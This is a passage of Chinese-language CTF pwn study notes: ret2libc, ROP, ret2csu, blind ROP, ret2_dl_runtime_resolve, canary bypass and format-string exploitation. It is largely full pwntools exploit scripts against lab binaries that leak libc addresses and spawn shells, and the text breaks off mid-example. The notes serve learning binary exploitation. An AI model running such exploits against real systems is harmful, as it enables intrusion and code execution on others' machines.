#参数的顺序是为了调用 write 函数。具体来说，write_plt 是 write 函数的地址，vulfun_addr 是调用 write 函数后执行的代码的地址，1 是文件描述符，write_got 是要写入的地址，4 是要写入的数据的长度。
#在调用函数时，参数的顺序是按照它们在函数声明中的顺序来确定的。例如，对于 write 函数，它的声明如下：
#ssize_t write(int fd, const void *buf, size_t count);
#write_plt, vulfun_addr, 1, write_got, 4
#由于在 payload 中，前面提到的参数依次是 write 函数的地址、调用后执行的代码的地址、文件描述符、要写入的地址和要写入的数据的长度，所以它们的顺序就是按照函数声明中参数的顺序来确定的。
p.sendline(payload1)
write_addr=u32(p.recv(4)) #接收4字节的来自程序的返回值 即write函数的地址
libc=LibcSearcher('write',write_addr)
#write参数表示要搜索的函数名，write_addr参数表示函数的地址。因此，libc=LibcSearcher('write',write_addr)这句代码的作用是创建一个LibcSearcher实例，用于搜索libc库中名为write的函数。
libcbase=write_addr-libc.dump("write") #.dump("write") 拿到的地址是 write 函数在 libc 库文件中的绝对地址
#.dump("write") 查找的是 write 函数在 libc 库文件中的位置，也就是在 libc 库文件中的绝对地址。这个绝对地址是在 libc 库文件加载到内存中时确定的，一旦 libc 库文件加载到内存中，它的地址就不会再改变。
#LibcSearcher('write', write_addr) 查找的是 write 函数在程序运行时在内存中的位置，也就是相对于程序基址的地址。每次程序运行时，由于内存布局随机化的原因，程序基址都可能不同，所以 write 函数在内存中的地址也会发生变化。
#通过减法运算得到 libc 库的基址的原理是：由于 libc 库文件加载到内存中时的绝对地址不会变化，所以可以通过将 write 函数在内存中的地址减去它在 libc 库文件中的绝对地址得到程序基址，从而得到 libc 库在内存中的基址。
#print(libcbase)
system_addr=libcbase+libc.dump("system")
#libc基址+system在libc中的绝对地址=system函数在程序中的地址
binsh_addr=libcbase+libc.dump("str_bin_sh") #同上
payload2='A'*140+p32(system_addr)+p32(1234)+p32(binsh_addr) 
#填充函数指针内存使其指向正确的地址 32位函数指针内存为4位，64位程序为8位。
p.sendline(payload2)
p.interactive()
```

##### x64

###### level3

**x86 与 x64 的区别：**
x86 都是保存在栈上面的 而 x64中的前六个参数依次保存在 **RDI, RSI, RDX, RCX, R8 和 R9** 中 如果还有更多的参数的话才会保存在栈上
64位程序使用的内存地址不能大于0x00007fffffffffff否则会抛出异常，但是我们依然可以通过 x/x $rsp 来查看即将返回的地址 返回的地址从右边取8位即返回的地址，因为是小端序显示的所以从右边来截取

```python
from pwn import *
p=process('./level3')
sys_addr=0x004005B6 #直接看ida中callsystem的函数 溢出跳过去直接拿下
pay='a'*136+p64(sys_addr)
p.sendline(pay)
p.interactive()
```

###### level4

程序源代码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
void systemaddr()
{
    void* handle = dlopen("libc.so.6", RTLD_LAZY);
    printf("%p\n",dlsym(handle,"system"));
    fflush(stdout);
}
void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}
int main(int argc, char** argv) {
    systemaddr();
    write(1, "Hello, World\n", 13);
    vulnerable_function();
}
```

本体利用LibcSearcher来寻找bin_sh的地址
相对的pop di等等指令使用Ropgadget命令来查找地址
Ropgadget --binary level4 --only 'pop | ret' | grep rdi

```python
from pwn import *
from LibcSearcher import *
p=process('./level4')
elf=ELF('./level4')
sys_addr=p.recvuntil('\n')
#源程序中的systemaddr函数调用了dlopen和dlsym函数，分别用来打开和解析动态库。
#其中，dlopen函数用来打开一个动态库，并返回一个句柄，可以用来加载库中的符号。
#dlsym函数则用来查找并返回指定符号的地址。
#在这个程序中，dlopen函数打开了"libc.so.6"动态库，然后dlsym函数查找并返回"system"符号的地址。
#systemaddr函数最后调用printf函数将返回的地址输出到标准输出。
#然后，sys_addr变量通过调用p.recvuntil('\n')接收这个地址。
#p.recvuntil函数是pwntools库中的一个函数，用来接收来自程序的输出，直到遇到指定的字符（在这里是换行符）为止。
#因此，sys_addr变量最终接收到的就是程序中system函数的地址。
sys_addr=int(sys_addr,16)
#将sys_addr变量的值转换为十进制整数。
libc=LibcSearcher('system',sys_addr)
#其实无所谓 十六进制也能执行 用u32(sys_addr)把它从32位机器码转成16进制地址也没问题
pop_ret_offset=0x0000000000021102-libc.dump('system')
pop_ret_addr=pop_ret_offset+sys_addr
libc_base=sys_addr-libc.dump('system')
bin_sh=libc_base+libc.dump('str_bin_sh')
#计算函数在程序中的地址与上面exp攻击脚本的原理相同
payload='a'*136+p64(pop_ret_addr)+p64(bin_sh)+p64(sys_addr)
#把bin_sh的地址pop进di寄存器中，再调用system函数，system会拿到di寄存器中的binsh作为参数执行
p.sendline(payload)
p.interactive()
```

###### Defcon 2015 Qualifier: R0pbaby

```python
from pwn import *
from LibcSearcher import *
ropbaby = ELF('./pwn')
sh = process('./pwn')
context.word_size = 64
#context.word_size 是 pwntools 库中的一个设置，它用来设置在 pwntools 中使用的字长（即操作系统所使用的字长）。
#在本例中，通过设置 context.word_size = 64，表示使用的是 64 位操作系统。
def getfuncaddress(func): #一个获取函数地址的程序 func为可输入的字符串
    sh.recvuntil(': ')
    sh.sendline('2') #根据程序运行进行回答
    sh.recvuntil('symbol: ')
    sh.sendline(func) #发送函数名字符串给程序
    sh.recvuntil(': ')
    addr = sh.recvuntil('\n', drop=True) #等待程序返回地址信息
    return int(addr, 16) #读取地址信息并将其转换为整数
def addropbuff(payload): #
    sh.recvuntil(': ')
    sh.sendline('3') #发送 "3" 给程序，以选择发送 ROP 链的功能
    sh.recvuntil('): ')
    length = len(payload) 
    sh.sendline(str(length)) #发送 ROP 链的长度给程序
    sh.sendline(payload) #发送 ROP 链给程序
#addropbuff(payload) 函数的功能是向程序发送 ROP 链，以在运行时执行特定的操作。
#ROP 链（Return-Oriented Programming，即返回导向编程）是一种攻击技术，用于在程序运行时执行恶意代码。
#它通过在程序的内存中插入恶意代码片段来实现。
rdi_ret_offset = 0x0000000000021102 #ROPgadget --binary pwn --only 'ret' | grep 'rdi'
system_addr = getfuncaddress('system') #通过如上的自定义的函数来获取system地址
libc = LibcSearcher('system', system_addr) #通过搜索system在程序中的地址来建立一个libc对象
libc_base = system_addr - libc.dump('system') #system在程序中的地址减去相对地址来得到libc的基址
binsh_addr = libc.dump('str_bin_sh') + libc_base #获取binsh在程序中的地址
rdi_ret = rdi_ret_offset + libc_base #获取rdi_ret在程序中的地址
print hex(system_addr), hex(binsh_addr), hex(rdi_ret) #输出这些地址
payload = flat(['b' * 8, rdi_ret, binsh_addr, system_addr]) 
#填充缓冲区后将binsh推入di寄存器 然后system函数执行将di寄存器中的binsh作为参数执行 system('/bin/sh')
addropbuff(payload)
sh.interactive()
```

#### Intermediate ROP

###### level5

objdump -d level5 进行反汇编 加上 -M intel参数以intel汇编格式进行显示即objdump -d -M intel level5

16位栈的颗粒度为2，32位栈颗粒度为4，64位栈颗粒度为8。

![](Pwn\ret2csu.png)

```python
#!python 使用时请删除掉中文注释
#!/usr/bin/env python
#wiki-ctf pwn ret2csu技术
from pwn import *
elf = ELF('level5')
p = process('./level5')
got_write = elf.got['write']
got_read = elf.got['read']
libc = elf.libc #建立libc对象

main_addr = 0x400564
bss_addr=0x601028
#write函数的原型 write(1, address, len) 1表示标准输出流，address是write函数要输出的地址，而len表示输出长度
#所以第一个p64(got_write)后的地址为write的参数p64(1) + p64(got_write) + p64(8)，即输出八位write_got的地址
payload1 =  "\x00"*136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) + p64(0x4005F0) + "\x00"*56 + p64(main_addr)
#利用 x64 下的 __libc_csu_init 中的 gadgets
#objdump -d -M intel level5后在反汇编代码中找到 __libc_csu_init
#其中的ret前面开始为寄存器赋值的地址为0x400606，填充后控制程序返回到该地址
#程序中0x400606地址开始的代码为mov rbx,QWORD PTR [rsp+0x8] 
#所以它是用栈顶位置的下一个颗粒赋值，因而在栈顶需要一个占位 即payload中p64(0x400606)后的p64(0)
#0x400601通过cmp指令对rbx和rbp比较，jne即jump not equal不相等就跳到指定位置0x4005f0 所以要让rbx和rbp值相同都为0
#因为0x4005fd处会给rbx+1 所以为了使之相等 就需要让rbx为0 加一后的rbx为1 而rbp也给的1 则相等
#0x4005f0与0x4005f3、0x4005f6处会将r15的值给rdx、r14的值给si、r13d的值给edi
#将数rdi、rsi、rdx要给的值提前在r13、r14、r15写好，即把write函数的参数提前写好
#之后它会执行一个call QWORD PTR [r12+rbx*8] 
#这里rbx给的0，乘8还是0，r12给的write的got地址，所以相加后会跳转到write，根据参数执行并输出write的地址
#因为0x400624处对栈顶下调了0x38，所以需要对栈顶+0x38 转为十进制为 56
#拿到write函数地址之后目的达到，最后加上p64(main_add)返回程序的main函数
p.recvuntil("Hello, World\n") #在第一个输入的地方发送攻击脚本
print "\n#############sending payload1#############\n"
p.send(payload1)
sleep(1)

write_addr = u64(p.recv(8)) #接收刚才由write函数输出的write函数地址
print "write_addr: " + hex(write_addr) #输出到shell
libc_base=write_addr-libc.symbols['write'] #计算基址
execve_addr=libc_base+libc.symbols['execve'] #拿到system函数在程序内的地址
print "execve_addr: " + hex(execve_addr) #输出system函数地址

p.recvuntil("Hello, World\n") #因为刚才返回到了main函数所以会再执行一遍
payload2 =  "\x00"*136 + p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) + p64(0x4005F0) + "\x00"*56 + p64(main_addr)
#填充缓冲区 read(0, bss_addr, 16)， bss段是存储数据变量的地方，0表示标准输入，读取该位置新加入的数据，然后再次返回main()
print "\n#############sending payload2#############\n"
p.send(payload2)
sleep(1)
p.send(p64(execve_addr)) #向刚才的地址输入system函数的地址
p.send("/bin/sh\0") #再写入/bin/sh 以执行system(/bin/sh) \0表示字符串结束
sleep(1)


p.recvuntil("Hello, World\n")
payload3 =  "\x00"*136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) + p64(0x4005F0) + "\x00"*56 + p64(main_addr) #逻辑如上 此次payload意在执行system(/bin/sh)
print "\n#############sending payload3#############\n"
sleep(1)
p.send(payload3)
p.interactive()
```

下面的exp是一样的思路

```python
# #coding:utf-8
from pwn import *
sh = process("./level5")
elf = ELF("./level5")
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = elf.libc
gadget1 = 0x0000000000400606
gadget2 = 0x00000000004005F0
write_got = elf.got['write']
main_addr = elf.symbols['main']
print "write_got:"+ hex(write_got)
print "main_Addr:"+ hex(main_addr)
def csu(r12,r13,r14,r15,ret_addr):
    payload = "a"*136
    payload += p64(gadget1)
    payload += 'b'*8
    payload += p64(0)
    payload += p64(1)
    payload += p64(r12)#function
    payload += p64(r13)#参数1
    payload += p64(r14)#参数2
    payload += p64(r15)#参数3
    payload += p64(gadget2)
    payload += 'c' * 0x38
    payload += p64(ret_addr)#re run
    sh.sendline(payload)
###第一次溢出，泄露write函数的地址
sh.recvuntil("Hello, World\n")
csu(write_got,1,write_got,8,main_addr)
#利用write函数（因为gadget2中的代码为call，所以必须为write函数的got地址）
#来读取write的got表内容，向后读取8个字节，然后返回至main住花鸟属
write_addr = u64(sh.recv(8))
#接收数据，并解包 
print hex(write_addr)
offset_addr = write_addr-libc.symbols['write']
print hex(offset_addr)#偏移地址
execve_addr = offset_addr + libc.symbols['execve']
print hex(execve_addr)
####第二次溢出，利用read函数写入execve()+/bin/sh
read_addr = elf.got['read'] 
bss_addr = elf.bss()
csu(read_addr,0,bss_addr,16,main_addr)
#读取用户输入的数据到指定的bss地址,写入16个字节
sh.recvuntil("Hello, World\n")
#gdb.attach(sh)
sh.send(p64(execve_addr)+'/bin/sh\x00')
#发送execve的地址加上/bin/sh到bss段
print "bss_addr:",hex(bss_addr)
###第三次溢出，调用bss地址内的代码
sh.recvuntil("Hello, World\n")
csu(bss_addr,bss_addr+8,0,0,main_addr)
#也就是利用gadget2中的call 来获取权限 
sh.interactive()
```

###### BROP

类似SQL盲注，本体的前提条件是没有给你文件，因此无法通过之前的方法进行栈空间的测量。
[[ctf wiki pwn\] stackoverflow：hctf2016-brop wp_漫小牛的博客-CSDN博客_hctf2016-brop](https://blog.csdn.net/weixin_43363675/article/details/118546822)
文件链接：https://pan.baidu.com/s/15PyzxeGyHXc7jHQh7A-K1A   提取码：0m8j

暴力枚举收集程序信息的脚本注释在最后完整的exp中写着

```python
from pwn import * #获取栈空间长度
def getsize():
        i = 1
        while 1:
                try:
                        p = remote('127.0.0.1',9999)
                        p.recvuntil('WelCome my friend,Do you know password?\n')
                        p.send(i*'a')
                        data = p.recv()
                        p.close()
                        if not data.startswith('No password'):
                                return i-1
                        else:
                                i+=1
                except EOFError:
                        p.close()
                        return i-1

size = getsize()
print "size is [%s]"%size

```

```python
from pwn import * #查找能让函数停住的地址
length = 72

def getStopGadgets(length):
        addr = 0x400000  
        while 1:
                try:
                        sh = remote('127.0.0.1', 9999)
                        payload = 'a'*length+p64(addr)
                        sh.recvuntil("know password?\n")
                        sh.sendline(payload)
                        output = sh.recvuntil("password?\n")
                        sh.close()
                        print("one success addr 0x%x:" % (addr))
                        if not output.startswith('WelCome'):
                                sh.close()
                                addr+=1
                        else:
                                return addr
                except Exception:
                        addr+=1
                        sh.close()
stop_gadgets = getStopGadgets(length)


```

```python
from pwn import * #查找ret2csu的gadget1
def get_brop_gadget(length, stop_gadget, addr):
        try:
                sh = remote('127.0.0.1', 9999)
                sh.recvuntil('password?\n')
                payload = 'a' * length + p64(addr) + p64(0)*6 + p64(stop_gadget) + p64(0)*10
                sh.sendline(payload)
                content = sh.recv()
                sh.close()
                print content
                return True
        except Exception:
                sh.close()
                return False

def check_brop_gadget(length, addr):
        try:
                sh = remove('127.0.0.1', 9999)
                sh.recvuntil('password?\n')
                payload = 'a' * length + p64(addr) + 'a'*8*10
                sh.sendline(payload)
                content = sh.recv()
                sh.close()
                return False
        except Exception:
                sh.close()
                return True

length = 72
stop_gadget = 0x4005c0
addr = 0x400740

while 1:
        print hex(addr)
        if get_brop_gadget(length, stop_gadget, addr):
                print 'possible brop gadget: 0x%x' % addr
                if check_brop_gadget(length, addr):
                        print 'success brop gadget: 0x%x' % addr
                        break
        addr += 1

```

```python
from pwn import * #查找puts_plt地址

length = 72
stop_gadget = 0x4005c0

def get_puts_addr(length, rdi_ret, stop_gadget):
        addr = 0x400500
        while 1:
                print hex(addr)
                sh = remote('127.0.0.1', 9999)
                sh.recvuntil('password?\n')
                payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
                sh.sendline(payload)
                try:
                        content = sh.recv()
                        if content.startswith('\x7fELF'):
                                print 'find puts@plt addr: 0x%x' % addr
                                return addr
                        sh.close()
                        addr += 1
                except Exception:
                        sh.close()
                        addr += 1

brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
get_puts_addr(72, rdi_ret, stop_gadget)

```

```python
from pwn import * #dump指定地址范围内的程序
def dump(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
        sh = remote('127.0.0.1', 9999)
        payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
        sh.recvuntil('password?\n')
        sh.sendline(payload)
        try:
                data = sh.recv()
                sh.close()
                try:
                        data = data[:data.index("\nWelCome")]
                except Exception:
                        data = data
                if data == "":
                        data = '\x00'
                return data
        except Exception:
                sh.close()
                return None

length = 72

stop_gadget = 0x4005c0

brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9

puts_plt = 0x400555
addr = 0x400000
result = ""
while addr < 0x401000:
        print hex(addr)
        data = dump(length, rdi_ret, puts_plt, addr, stop_gadget)
        if data is None:
                continue
        else:
                result += data
        addr += len(data)
with open('code', 'wb') as f:
        f.write(result)
```

把生成的core文件用ida打开，打开方式为binary，选择菜单“edit”-“segments” -“Rebase program”，地址设置为0x4000000，拖到0x400555的位置，在地址上按c，就能看到汇编的格式下puts_plt要跳转的puts_got地址
0x601018就是plt跳转的地址，也就是put函数got表的地址

```python
#coding=utf8
from pwn import *

sh = remote('127.0.0.1', 9999)

#sh = process('./brop')

#context.log_level = 'debug'


def getbufferflow_length():
    i = 1
    while 1:
        try:
            sh = remote('127.0.0.1', 9999)
            sh.recvuntil('WelCome my friend,Do you know password?\n')
            sh.send(i * 'a')
            output = sh.recv()
            sh.close()
            #只有输入超过的栈空间输入范围才会出现'No password'以外的情况 即已经比缓存范围大了
            if not output.startswith('No password'):
                return i - 1 #所以-1即可得到可以刚好填满接收输入的栈空间的大小
            else:
                i += 1
        except EOFError:
            sh.close()
            return i - 1 #同理


def get_stop_addr(length):
    addr = 0x400000
    while 1:
        try:
            sh = remote('127.0.0.1', 9999)
            sh.recvuntil('password?\n')
            payload = 'a' * length + p64(addr) #覆盖后返回到的地址可以让程序停下不崩溃
            sh.sendline(payload)
            content = sh.recv()
            print content
            sh.close()
            print 'one success stop gadget addr: 0x%x' % (addr)
        except Exception:
            addr += 1
            sh.close()

def csu_gadget(csu_last, csu_middle, saved_addr, arg1=0x0, arg2=0x0, arg3=0x0): #ret2csu技术
    payload = p64(csu_last)  # pop rbx,rbp,r12,r13,r14,r15, ret
    payload += p64(0x0)  # rbx be 0x0
    payload += p64(0x1)  # rbp be 0x1
    payload += p64(saved_addr)  # r12 jump to
    payload += p64(arg3)  # r13 -> rdx    arg3
    payload += p64(arg2)  # r14 -> rsi    arg2
    payload += p64(arg1)  # r15 -> edi    arg1
    payload += p64(csu_middle)  # will call [rbx + r12 * 0x8]
    payload += 'A' * 56  # junk
    return payload


def get_brop_gadget(length, stop_gadget, addr): #获取gadget1
    try:
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(
            stop_gadget) + p64(0) * 10
        #只要可以连续给6个寄存器写入值 并且stop_gadget停住即可 
        #停住后 p64(0) * 10是为了确保程序可以正常崩溃防止意外情况 实际上程序停住就不会到这里
        sh.sendline(payload)
        content = sh.recv() #接收返回文本
        sh.close()
        print content
        # stop gadget returns memory
        if not content.startswith('WelCome'): #如果返回文本不是'WelCome'即失败
            return False
        return True #否则返回真
    except Exception:
        sh.close()
        return False

#检查找的地址对不对 只要该地址在payload的'a' * 8 * 10后能正常崩溃说明没有问题
def check_brop_gadget(length, addr):
    try:
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + 'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True

#包装上面的几个寻找检查gadget的函数
def find_brop_gadget(length, stop_gadget):
    addr = 0x400740
    while 1:
        print hex(addr)
        if get_brop_gadget(length, stop_gadget, addr):
            print 'possible brop gadget: 0x%x' % addr
            if check_brop_gadget(length, addr):
                print 'success brop gadget: 0x%x' % addr
                return addr #如果找的没有问题就输出并返回该地址
            addr += 1
#输出puts
#用brop gadget的地址来获取puts的地址
#brop gadget的最后两条汇编指令为pop r15; ret对应的字节码是41 5f c3
#后两字节码5f c3对应的汇编为pop rdi;ret。所以pop rdi;ret的地址就是brop gadget +9
#即从pop rbx&rbp(brop gadget)开始的4.5条指令开始的机器码为pop rdi;ret 通过这个gadget把put的plt打出来
def get_puts_addr(length, rdi_ret, stop_gadget):
    addr = 0x400000
    while 1:
        print hex(addr)
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(
            addr) + p64(stop_gadget)
        #0x400000写入到rdi中 如果调用到了puts 那么就会输出0x400000
        sh.sendline(payload)
        try:
            content = sh.recv()
            if content.startswith('\x7fELF'): #\x7fELF为puts输出的0x400000机器码开头
                print 'find puts@plt addr: 0x%x' % addr
                return addr
            sh.close()
            addr += 1
        except Exception:
            sh.close()
            addr += 1

#用puts_plt地址puts输出整个程序 把程序整个dump下来
def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 9999)
    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
        puts_plt) + p64(stop_gadget) #利用puts_plt暴力输出
    sh.recvuntil('password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close() #接收到程序输出后关闭端口上程序的连接
        try:
            data = data[:data.index("\nWelCome")]
        except Exception:
            data = data
        if data == "":
            data = '\x00'
        return data
    except Exception:
        sh.close()
        return None

def leakfunction(length, rdi_ret, puts_plt, stop_gadget):
    addr = 0x400000
    result = ""
    while addr < 0x401000:
        print hex(addr)
        data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)
        if data is None:
            continue
        else:
            result += data
            addr += len(data)
    with open('code', 'wb') as f:
        f.write(result)


#length = getbufferflow_length()
length = 72
#stop_gadget = get_stop_addr(length)
stop_gadget = 0x4006b6
#brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
#puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
puts_plt = 0x400560
#leakfunction(length, rdi_ret, puts_plt, stop_gadget)
puts_got = 0x601018

sh = remote('127.0.0.1', 9999)
sh.recvuntil('password?\n')
payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(
    stop_gadget)
sh.sendline(payload)
#data = sh.recvuntil('\nWelCome')
data = sh.recvuntil('\nWelCome', drop=True) 
#输出的内容会有\nWelCome且作为小端序排列 如下
#\xa0֪@p\x7f
#WelCome
#所以drop=True是丢弃第一个参数 即'\nWelCome'

puts_addr = u64(data.ljust(8, '\x00')) #向左对齐为8位并以0替补空缺位置 同时进行解包
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = puts_addr - libc.symbols["puts"]
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search('/bin/sh')) #0x18ce57
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(
    system_addr) + p64(stop_gadget)
sh.sendline(payload)
sh.interactive()
```

#### Advanced ROP

###### ret2_dl_runtime_resolve

[[原创\]ROP高级用法之ret2_dl_runtime_resolve-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)](https://bbs.kanxue.com/thread-250703.htm)

```python
from pwn import *
name = './main'
p = process(name)
elf= ELF(name)
bss_addr=elf.bss()

rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr   #0x8048330
dynsym_addr =  elf.get_section_by_name('.dynsym').header.sh_addr    #0x80481d8
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr     #0x8048278
resolve_plt = 0x08048380
leave_ret_addr = 0x8048458

start = 0x804a840
fake_rel_plt_addr = start
fake_dynsym_addr = fake_rel_plt_addr + 0x8
fake_dynstr_addr = fake_dynsym_addr + 0x10
bin_sh_addr = fake_dynstr_addr + 0x7
n = fake_rel_plt_addr - rel_plt_addr
r_info = (((fake_dynsym_addr - dynsym_addr)/0x10) << 8) + 0x7
str_offset = fake_dynstr_addr - dynstr_addr
fake_rel_plt = p32(elf.got['read']) + p32(r_info)
fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0x12000000)
fake_dynstr = "system\x00/bin/sh\x00\x00"
pay1 = 'a'*108 + p32(start - 20) + p32(elf.plt['read']) + p32(leave_ret_addr) + p32(0) + p32(start - 20) + p32(0x100)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(pay1)
pay2 = p32(0x0) + p32(resolve_plt) + p32(n) + 'aaaa' + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstr
p.sendline(pay2)
#########
success(".rel_plt: " + hex(rel_plt_addr))
success(".dynsym: " + hex(dynsym_addr))
success(".dynstr: " + hex(dynstr_addr))
success("fake_rel_plt_addr: " + hex(fake_rel_plt_addr))
success("fake_dynsym_addr: " + hex(fake_dynsym_addr))
success("fake_dynstr_addr: " + hex(fake_dynstr_addr))
success("n: " + hex(n))
success("r_info: " + hex(r_info))
success("offset: " + hex(str_offset))
success("system_addr: " + hex(fake_dynstr_addr))
success("bss_addr: " + hex(elf.bss()))
p.interactive()
```

### Canary

在函数开始时就随机产生一个值，将这个值CANARY放到栈上紧挨ebp的上一个位置，当攻击者想通过缓冲区溢出覆盖ebp或者ebp下方的返回地址时，一定会覆盖掉CANARY的值；当程序结束时，程序会检查CANARY这个值和之前的是否一致，如果不一致，则不会往下运行，从而避免了缓冲区溢出攻击。

#### Canary绕过

+ 泄露

  > + 格式化字符串
  > + 连带输出
  > + 爆破(fork)

+ Stack smashing (2.23)

+ 劫持 \_\_stack\_chk_fail

+ TLS (本地线程存储)



### Format String

相关pwn文件以及exp攻击脚本见如下链接：
链接:https://pan.baidu.com/s/1MgMBY5PenTEFFq5IbDgd3w 提取码:r0oq

#### 利用方法

##### 漏洞原理

格式化字符串漏洞其产生根源是 printf 函数设计的缺陷，**即 printf() 函数并不能确定数据参数 arg1, arg2… 究竟在什么地方结束**，即它不知道参数的个数。**它只会根据 format 中的打印格式的数目依次打印堆栈中参数 format 后面地址的内容**。
**格式化字符串漏洞发生的条件就是格式字符串要求的参数和实际提供的参数不匹配。**
printf("%s %d %d %d %x\n",buf, 1, 2, 3)，紧随格式化字串后压入栈上的参数为4个，但格式化字串有5个参数，printf 在解析第五个参数%x时，**会继续往栈上读取**，造成了**信息泄露**。

##### 常见语法

`%d —— 打印signed int` 打印有符号整数
`%u —— 打印unsigned int` 打印无符号整数
`%s —— 打印参数地址处的字符串`
`%x —— 打印 hex 形式的整数` 打印十六进制的整数
`%p —— 打印指针 即 void*`
`%<n>c —— 打印字符串的宽度` 

%<正整数 n>c 打印宽度为n的字符串(打印长度为n)

+ ```c
  printf("%10c", 0x41);
  ```

  打印 A ( A 的ASCII码值为0x41)，宽度为 10，因此A前面填充 9 个空格
  打印字符：xxxxxxxxxA (此处 x 表示空格)

+ ```c
  printf("%123c", 0x41);
  ```

  打印字符串长度为123，用空格填充

关于 %n 、 %hn 、 %hhn
%n 将当前已打印的字符的个数 ( 4 字节) 写入参数地址处 [n = number 数量，4字节]
%hn 将当前已打印字符的个数 ( 2 字节) 写入参数地址处 [hn = half number 一半 数量，2字节]
%hhn 将当前已打印字符的个数 ( 1 字节) 写入参数地址处 [hhn = half half number 一半 一半 数量，1字节]

+ ```c
  printf("%10c%n", 0x41, 0x41414141);
  ```

  打印字符串长度为10的A，并将 10 ( 4 字节) 写入到0x41414141

+ ```c
  printf("%1337c%hhn", 0x41, 0x804A000);
  ```

  因为 1337 = 0x539，所以往地址处写入 1 字节 0x39

关于 $ 符号
%<正整数 n>$<fmt> 指定占位符对应的第 n 个参数，例如 %12$x 指 %x 对应第 12 个参数

+ ```c
  printf("0x%2$x:0x%1$x\n", 0xdeadbeef, 0xcafebabe);
  ```

  当中的%2$x对应的第二个参数，%1$x对应的第一个参数
  打印结果：0xcafebabe，0xdeadbeef

##### 泄露内存

```c
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}
```

```shell
gcc -m32 -fno-stack-protector -no-pie -o fs1 1.c
```

```shell
#gdb 进行调试
b printf #break printf 在printf函数处下一个断点
r #run 执行
%08x.%08x.%08x #程序等待输入时输入
c #continue 继续执行
#输出如下内容
00000001.22222222.ffffffff.%08x.%08x.%08x
c #继续执行
#输出如下内容
ffffcf70.f7fe2a70.f7ffdc08 #从栈中泄露出来了三个地址
#如果想泄露相对当前栈顶指针位置的指定第几个栈空间数据 可以使用%n$x
r #再次从头运行程序
%3$x #输入攻击的格式化字符串
c
c
f7ffdc08 #输出了第三个地址
```

>```
>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别
>利用 %s 来获取变量所对应地址的内容，只不过有零截断
>利用 %n$x 来获取指定参数的值，利用 %n$s 来获取指定参数对应地址的内容
>```

##### 泄露任意地址

继续使用如上的程序，运行后等待输入时输入：AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p

```shell
00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
AAAA0xffd910900xf7f95a700xf7fb0c080x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffd911540xf7f6a0000xf7e9e037 #如上为输出结果
```

**A的ASCII编码为0x41**，所以泄露出来的地址中为**0x41414141**，即输入的AAAA，从泄露出来的地址开始计数，**第四个地址为AAAA**开始泄露的地址，由此拿到第几个参数是会被泄露出来的。
**如果输入的AAAA换成了某一个got地址，后面就会泄露出got中的地址。**
**格式化字符串前面的字符串泄露在了第几个参数那它就是在栈中的第几个参数，如果是写在格式化字符串后面，它就是第n+1个参数。**

```python
from pwn import *
sh = process('./fs1')
elf = ELF('./fs1')
__isoc99_scanf_got = elf.got['__isoc99_scanf'] #scanf的got地址
print hex(__isoc99_scanf_got) 
payload = p32(__isoc99_scanf_got) + '%4$s' #泄露第四个参数 即got地址
#输出内容为p32(__isoc99_scanf_got) + 格式化%s后got内部内部的地址 因此后续截取字符串为[4:8]
print payload
sh.sendline(payload)
sh.recvuntil('%4$s\n')#print payload中接收到payload后面的'%4$s'后
print hex(u32(sh.recv()[4:8])) #就接收并截取需要的地址
sh.interactive()
```

##### 覆盖栈内存

```c
#include <stdio.h>
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {
